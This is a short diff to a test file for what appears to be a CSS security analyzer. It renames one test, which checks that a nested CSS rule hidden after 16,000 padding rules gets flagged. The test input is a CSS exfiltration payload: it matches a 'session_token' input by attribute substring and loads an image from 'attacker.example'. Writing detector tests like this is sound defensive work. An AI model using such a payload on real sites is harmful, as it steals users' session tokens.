@@ -179,7 +179,7 @@ describe("core analyzer", () => {
     expect(summary.findings[0].reasons).toContain("url.local_network");
   });
 
-  it("uses source scanning for oversized nested CSS rules", () => {
+  it("supplements primary parsing with source scanning for late nested CSS rules", () => {
     const padding = Array.from({ length: 16_000 }, (_, index) => `.utility-${index}{display:block}`).join("\n");
     const summary = analyze(`${padding}\n.card{& input[name="session_token"][value*="abc"]{mask-image:url("https://attacker.example/nested-oversized")}}`);
     expect(summary.findings.some((finding) => finding.reasons.includes("selector.attribute.substring_match"))).toBe(true);
